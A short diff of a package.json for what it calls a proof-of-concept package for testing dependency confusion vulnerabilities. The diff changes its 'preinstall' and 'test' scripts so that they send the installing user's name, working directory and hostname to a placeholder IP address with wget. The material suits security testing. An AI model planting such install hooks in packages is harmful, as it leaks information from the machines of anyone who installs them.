@@ -4,8 +4,8 @@
   "description": "Simple PoC package for testing for dependency confusion vulnerabilities.",
   "main": "index.js",
   "scripts": {
-    "test": "wget --quiet http://8.8.8.8/$(whoami) # CHANGE IP ADDRESS",
-    "preinstall": "wget --quiet http://8.8.8.8/$(whoami) # CHANGE IP ADDRESS"
+    "test": "wget --quiet \"http://8.8.8.8/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\" # CHANGE IP ADDRESS",
+    "preinstall": "wget --quiet \"http://8.8.8.8/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\" # CHANGE IP ADDRESS"
   },
   "keywords": [
     "test",
